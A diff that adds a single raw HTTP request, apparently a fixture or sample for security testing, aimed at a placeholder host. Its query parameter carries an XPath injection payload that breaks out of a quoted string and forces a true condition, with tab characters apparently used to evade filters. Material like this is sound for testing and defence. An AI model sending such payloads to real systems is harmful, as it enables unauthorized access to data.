@@ -1,0 +1,4 @@
+GET /a?input="%09or%09string-length(/*)>0%09or%09" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
